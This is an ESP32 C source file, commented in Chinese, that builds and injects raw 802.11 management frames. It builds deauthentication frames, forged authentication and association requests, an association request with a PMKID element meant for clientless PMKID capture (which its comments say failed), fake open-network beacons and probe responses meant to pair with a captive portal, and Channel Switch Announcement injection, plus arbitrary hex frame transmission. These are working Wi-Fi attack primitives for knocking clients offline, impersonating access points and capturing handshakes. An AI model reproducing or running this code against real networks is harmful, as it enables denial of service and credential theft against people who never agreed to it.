/*
 * frame_build.c: 802.11 管理帧构造 + 原始注入
 *
 * 帧格式参考 IEEE 802.11-2020 §9.3.3 (管理帧):
 *   FC(2) Duration(2) Addr1(6) Addr2(6) Addr3(6) Seq(2) [Body]
 *   Beacon/ProbeResp Body = 时间戳(8) 信标间隔(2) 能力(2) + IEs
 */
#include "frame_build.h"

#include <string.h>
#include <stdio.h>
#include "esp_wifi.h"
#include "esp_random.h"
#include "esp_log.h"

static const char *TAG = "FB";

/* 管理帧 subtype */
#define ST_ASSOC_REQ   0x00
#define ST_PROBE_RESP  0x05
#define ST_BEACON      0x08
#define ST_AUTH        0x0B
#define ST_DEAUTH      0x0C

/* 支持速率集 (1/2/5.5/11/6/9/12/18 Mbps), 不带 basic 标记以保证兼容 */
static const uint8_t k_rates[] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};

void fb_random_local_mac(uint8_t out[6])
{
    esp_fill_random(out, 6);
    out[0] = (uint8_t)((out[0] & 0xFE) | 0x02);   /* 单播 + 本地管理 */
}

esp_err_t fb_tx(const uint8_t *frame, int len)
{
    if (!frame || len < 10) return ESP_ERR_INVALID_ARG;
    if (((frame[0] >> 2) & 0x3) != 0) {
        ESP_LOGW(TAG, "只支持管理帧 (type 0), 当前 type=%u", (unsigned)((frame[0] >> 2) & 0x3));
        return ESP_ERR_INVALID_ARG;
    }
    return esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true);
}

/* 公共: 管理帧头 */
static int put_hdr(uint8_t *o, uint8_t subtype, const uint8_t a1[6],
                   const uint8_t a2[6], const uint8_t a3[6])
{
    int p = 0;
    o[p++] = (uint8_t)(subtype << 4);        /* version 0, type 0, subtype */
    o[p++] = 0x00;                           /* flags: 非 toDS/fromDS */
    o[p++] = 0x00; o[p++] = 0x00;            /* duration */
    memcpy(o + p, a1, 6); p += 6;
    memcpy(o + p, a2, 6); p += 6;
    memcpy(o + p, a3, 6); p += 6;
    o[p++] = 0x00; o[p++] = 0x00;            /* seq (驱动会覆盖) */
    return p;
}

/* 追加一个 IE */
static int put_ie(uint8_t *o, int p, uint8_t id, const uint8_t *val, int vlen)
{
    o[p++] = id;
    o[p++] = (uint8_t)vlen;
    if (vlen > 0 && val) { memcpy(o + p, val, vlen); p += vlen; }
    return p;
}

int fb_deauth(uint8_t *out, int cap, const uint8_t bssid[6], const uint8_t sta[6], uint16_t reason)
{
    if (cap < 26) return 0;
    int p = put_hdr(out, ST_DEAUTH, sta, bssid, bssid);
    out[p++] = (uint8_t)(reason & 0xFF);
    out[p++] = (uint8_t)(reason >> 8);
    return p;
}

int fb_auth(uint8_t *out, int cap, const uint8_t bssid[6], const uint8_t sta[6],
            uint16_t seq, uint16_t algo)
{
    if (cap < 30) return 0;
    int p = put_hdr(out, ST_AUTH, bssid, sta, bssid);
    out[p++] = (uint8_t)(algo & 0xFF);  out[p++] = (uint8_t)(algo >> 8);
    out[p++] = (uint8_t)(seq & 0xFF);   out[p++] = (uint8_t)(seq >> 8);
    out[p++] = 0x00; out[p++] = 0x00;   /* status = 0 (success) */
    return p;
}

int fb_assoc_req(uint8_t *out, int cap, const uint8_t bssid[6], const uint8_t sta[6],
                 const uint8_t *ssid, int ssid_len, uint8_t ch)
{
    if (cap < 64 || ssid_len < 0 || ssid_len > 32) return 0;
    int p = put_hdr(out, ST_ASSOC_REQ, bssid, sta, bssid);
    out[p++] = 0x11; out[p++] = 0x04;       /* capability: ESS + ShortPreamble + ShortSlot */
    out[p++] = 0x0A; out[p++] = 0x00;       /* listen interval */
    p = put_ie(out, p, 0, ssid, ssid_len);
    p = put_ie(out, p, 1, k_rates, sizeof(k_rates));
    p = put_ie(out, p, 3, &ch, 1);
    return p;
}

/* 带 RSN IE (PMKID Count = 1) 的 Assoc Request.
 *
 * 保留但未使用: 「无客户端 PMKID」需要它, 但实测在本硬件上做不成, 对
 * -73dBm 的强信号 WPA2 目标发 Auth + 本帧, esp_wifi_80211_tx 返回 ESP_OK,
 * 但 AP 毫无回应 (连 auth response 都没有, seen_m1..m4 全 0), 说明 STA 接口
 * 不在对应状态时帧并未真正被有效发出. 留在这里是为了让后来的人不必重试. */
int fb_assoc_req_rsn(uint8_t *out, int cap, const uint8_t bssid[6], const uint8_t sta[6],
                     const uint8_t *ssid, int ssid_len, uint8_t ch)
{
    if (cap < 160 || ssid_len < 0 || ssid_len > 32) return 0;
    int p = put_hdr(out, ST_ASSOC_REQ, bssid, sta, bssid);
    /* capability 必须带 Privacy(0x0010): 带 RSN IE 却不声明加密的关联请求
     * 自相矛盾, WPA2 AP 会直接拒绝关联, 那样永远等不到 M1. */
    out[p++] = 0x31; out[p++] = 0x04;
    out[p++] = 0x0A; out[p++] = 0x00;
    p = put_ie(out, p, 0, ssid, ssid_len);
    p = put_ie(out, p, 1, k_rates, sizeof(k_rates));
    p = put_ie(out, p, 3, &ch, 1);

    uint8_t rsn[40];
    int r = 0;
    rsn[r++] = 0x01; rsn[r++] = 0x00;                       /* version 1 */
    rsn[r++] = 0x00; rsn[r++] = 0x0F; rsn[r++] = 0xAC; rsn[r++] = 0x04;  /* group CCMP */
    rsn[r++] = 0x01; rsn[r++] = 0x00;                       /* pairwise count = 1 */
    rsn[r++] = 0x00; rsn[r++] = 0x0F; rsn[r++] = 0xAC; rsn[r++] = 0x04;  /* CCMP */
    rsn[r++] = 0x01; rsn[r++] = 0x00;                       /* AKM count = 1 */
    rsn[r++] = 0x00; rsn[r++] = 0x0F; rsn[r++] = 0xAC; rsn[r++] = 0x02;  /* PSK */
    rsn[r++] = 0x00; rsn[r++] = 0x00;                       /* RSN caps */
    rsn[r++] = 0x01; rsn[r++] = 0x00;                       /* PMKID count = 1 */
    memset(rsn + r, 0, 16); r += 16;                        /* PMKID (占位) */
    p = put_ie(out, p, 48, rsn, r);
    return p;
}

/* Beacon / Probe Response 主体相同, 只是 subtype 与 addr1 不同 */
static int build_beacon_like(uint8_t *out, int cap, uint8_t subtype,
                             const uint8_t a1[6], const uint8_t bssid[6],
                             const uint8_t *ssid, int ssid_len, uint8_t ch)
{
    if (cap < 96 || ssid_len < 0 || ssid_len > 32) return 0;
    int p = put_hdr(out, subtype, a1, bssid, bssid);
    /* 固定字段 */
    memset(out + p, 0, 8); p += 8;             /* timestamp */
    out[p++] = 0x64; out[p++] = 0x00;          /* beacon interval = 100 TU */
    /* capability: ESS + ShortPreamble + ShortSlot, 不置 Privacy
     * (开放网络: 客户端无需口令即可关联, 正好配合门户) */
    out[p++] = 0x11; out[p++] = 0x04;
    p = put_ie(out, p, 0, ssid, ssid_len);
    p = put_ie(out, p, 1, k_rates, sizeof(k_rates));
    p = put_ie(out, p, 3, &ch, 1);
    return p;
}

int fb_beacon(uint8_t *out, int cap, const uint8_t bssid[6],
              const uint8_t *ssid, int ssid_len, uint8_t ch)
{
    static const uint8_t bc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    return build_beacon_like(out, cap, ST_BEACON, bc, bssid, ssid, ssid_len, ch);
}

int fb_probe_resp(uint8_t *out, int cap, const uint8_t dst[6], const uint8_t bssid[6],
                  const uint8_t *ssid, int ssid_len, uint8_t ch)
{
    return build_beacon_like(out, cap, ST_PROBE_RESP, dst, bssid, ssid, ssid_len, ch);
}


int fb_append_csa(uint8_t *frame, int len, int cap, uint8_t new_ch, uint8_t count)
{
    if (!frame || len <= 0 || len + 5 > cap) return 0;
    frame[len++] = 37;          /* Element ID: Channel Switch Announcement */
    frame[len++] = 3;
    frame[len++] = 0;           /* switch mode 0: 立即切换 */
    frame[len++] = new_ch;
    frame[len++] = count;       /* 剩余 beacon 数, 1 表示下一个就切 */
    return len;
}

static int hex_nibble(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

esp_err_t fb_tx_hex(const char *hex, int *out_len)
{
    if (!hex) return ESP_ERR_INVALID_ARG;
    /* 512 上限与 CAP_MAX_FRAME / RFTOOL_MAX_FRAME_LEN 保持一致 */
    uint8_t buf[512];
    int n = 0, hi = -1;
    for (const char *s = hex; *s; s++) {
        if (*s == ' ' || *s == ':' || *s == '-' || *s == ',' || *s == '\t' || *s == '\n') continue;
        int v = hex_nibble(*s);
        if (v < 0) { ESP_LOGW(TAG, "非法 hex 字符 '%c'", *s); return ESP_ERR_INVALID_ARG; }
        if (hi < 0) { hi = v; continue; }
        if (n >= (int)sizeof(buf)) { ESP_LOGW(TAG, "帧长超过 %d 字节", (int)sizeof(buf)); return ESP_ERR_INVALID_SIZE; }
        buf[n++] = (uint8_t)((hi << 4) | v);
        hi = -1;
    }
    if (hi >= 0) { ESP_LOGW(TAG, "hex 位数是奇数"); return ESP_ERR_INVALID_ARG; }
    if (n < 10) { ESP_LOGW(TAG, "帧太短 (%d 字节)", n); return ESP_ERR_INVALID_SIZE; }

    esp_err_t e = fb_tx(buf, n);
    if (out_len) *out_len = n;
    return e;
}
